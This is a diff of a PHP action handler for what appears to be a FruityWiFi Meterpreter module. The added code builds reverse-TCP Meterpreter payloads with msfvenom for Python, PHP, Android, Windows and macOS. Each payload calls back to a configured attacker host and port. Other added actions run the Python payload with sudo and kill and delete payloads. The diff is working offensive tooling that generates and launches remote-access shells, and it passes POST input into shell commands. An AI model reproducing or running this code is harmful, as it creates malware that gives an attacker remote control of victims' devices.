@@ -1,6 +1,6 @@
 <? 
 /*
-    Copyright (C) 2013-2014 xtr4nge [_AT_] gmail.com
+    Copyright (C) 2013-2020 xtr4nge [_AT_] gmail.com
 
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -25,74 +25,188 @@ include "../../../functions.php";
 // Checking POST & GET variables...
 if ($regex == 1) {
     regex_standard($_GET["service"], "../msg.php", $regex_extra);
-    regex_standard($_GET["action"], "../msg.php", $regex_extra);
+    regex_standard($_POST["action"], "../msg.php", $regex_extra);
     regex_standard($_GET["page"], "../msg.php", $regex_extra);
+    regex_standard($_POST["payloadtype"], "../msg.php", $regex_extra);
     regex_standard($io_action, "../msg.php", $regex_extra);
-    regex_standard($_GET["install"], "../msg.php", $regex_extra);
 }
 
 $service = $_GET['service'];
-$action = $_GET['action'];
+$action = $_POST['action'];
 $page = $_GET['page'];
-$install = $_GET['install'];
+$payloadtype = $_POST['payloadtype'];
 
 if($service != "") {
     
     if ($action == "start") {
-        
-        // COPY LOG
-        if ( 0 < filesize( $mod_logs ) ) {
-            $exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
-            //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-            exec_fruitywifi($exec);
-            
-            $exec = "$bin_echo '' > $mod_logs";
-            //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-            exec_fruitywifi($exec);
-        }
-			
-		$exec = "$bin_php meterpreter.php > /dev/null &";
-        //exec($exec);
-		//exec("$bin_danger \"$exec\"" );
-        exec_fruitywifi($exec);
-		
+       	
     } else if($action == "stop") {
-        // STOP MODULE
-		$exec = "ps aux|grep 'meterpreter\.php'|awk '{print $2}'";
-		exec($exec, $output);
-        //$exec = "$bin_killall $mod_name";
-		$exec = "$bin_kill " . $output[0];
-        //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-        exec_fruitywifi($exec);
-        
-        // COPY LOG
-        if ( 0 < filesize( $mod_logs ) ) {
-            $exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
-            //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-            exec_fruitywifi($exec);
-            
-            $exec = "$bin_echo '' > $mod_logs";
-            //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-            exec_fruitywifi($exec);
-        }
-
+       
     }
 
 }
 
-if ($install == "install_$mod_name") {
-
-    $exec = "chmod 755 install.sh";
-    //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-    exec_fruitywifi($exec);
-
-    $exec = "$bin_sudo ./install.sh > $log_path/install.txt &";
-    //exec("$bin_danger \"$exec\"" ); //DEPRECATED
-    exec_fruitywifi($exec);
-
-    header('Location: ../../install.php?module='.$mod_name);
-    exit;
+if ($action == "deletepayload") {
+	if (file_exists($payloc)){
+		$exec = "rm -r $payloc";
+		exec_fruitywifi($exec);
+	}
 }
+
+if ($action == "build") {
+	if ($payloadtype != "" ){
+		
+		//DELETE EXISTING PAY
+		if (file_exists($payloc)){
+		$exec = "rm -r $payloc";
+		exec_fruitywifi($exec);
+		}
+     
+                // COPY LOG
+        	if ( 0 < filesize( $mod_logs ) ) {
+            	$exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
+            	exec_fruitywifi($exec);
+            
+            	$exec = "$bin_echo '' > $mod_logs";
+            	exec_fruitywifi($exec);
+        	}
+
+		//PAYLOAD PYTHON
+ 		if ($payloadtype == "python"){
+		$payname = "payload.py";
+		$type = "python";
+		$work = "true";
+
+		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "screen -d -m msfvenom -p python/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -f raw -o $mod_path/includes/builds/$payname &>> $mod_logs";
+		exec_fruitywifi($exec);
+		}  
+
+		//PAYLOAD PHP
+ 		if ($payloadtype == "php"){
+		$payname = "payload.php";
+		$type = "php";
+		$work = "false";
+
+		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+
+		$exec = "screen -d -m msfvenom -p  php/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -f raw -o $mod_path/includes/builds/$payname &>> $mod_logs";
+		exec_fruitywifi($exec);
+		}  
+
+		//PAYLOAD APP
+ 		if ($payloadtype == "app"){
+		$payname = "payload.apk";
+		$type = "apk";
+		$work = "false";
+
+		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+
+		$exec = "screen -d -m msfvenom -p android/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port  -o $mod_path/includes/builds/$payname &>> $mod_logs";
+		exec_fruitywifi($exec);
+		}  
+
+		//PAYLOAD EXE
+ 		if ($payloadtype == "exe"){
+		$payname = "payload.exe";
+		$type = "exe";
+		$work = "false";
+
+		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+
+		$exec = "screen -d -m msfvenom -p windows/meterpreter_reverse_tcp  lhost=$meterpreter_host lport=$meterpreter_port -f exe -o $mod_path/includes/builds/$payname &>> $mod_logs";
+		exec_fruitywifi($exec);
+		}  
+
+		//PAYLOAD OSX
+ 		if ($payloadtype == "osx"){
+		$payname = "payload.bin";
+		$type = "bin";
+		$work = "false";
+
+		$exec = "/bin/sed -i 's/^\\\$payfile.*/\\\$payfile = \\\"".$payname."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paytype.*/\\\$paytype = \\\"".$type."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+		$exec = "/bin/sed -i 's/^\\\$paycomp.*/\\\$paycomp = \\\"".$work."\\\";/g' ../_info_.php";
+		exec_fruitywifi($exec);
+
+
+		$exec = "screen -d -m msfvenom -p osx/x64/meterpreter_reverse_tcp lhost=$meterpreter_host lport=$meterpreter_port -f macho -o $mod_path/includes/builds/$payname &>> $mod_logs";
+		exec_fruitywifi($exec);
+		}  
+
+
+
+
+	}
+}
+
+if ($action == "executepayload"){
+	if ($paycomp == "true"){
+	//Python PAYLOAD
+	  if ($paytype == "python"){
+		$exec = "cp $payloc $mod_path/includes/$payfile";
+		exec_fruitywifi($exec);
+
+		$exec = "$bin_sudo screen -d -m python $payfile";
+		exec_fruitywifi($exec);
+
+	  }
+	
+     }  
+} 
+
+if ($action == "stoppayload"){
+     	$exec = "ps aux|grep -iEe 'payload' | grep -v grep | awk '{print $2}'";
+		exec($exec,$output);	
+		$exec = "kill " . $output[0];
+		exec_fruitywifi($exec);
+
+	if (file_exists($payfile)){
+	  	$exec = "rm -r $payfile";
+		exec_fruitywifi($exec);
+	}
+} 
+
+
+
+
+
 
 if ($page == "status") {
     header('Location: ../../../action.php');
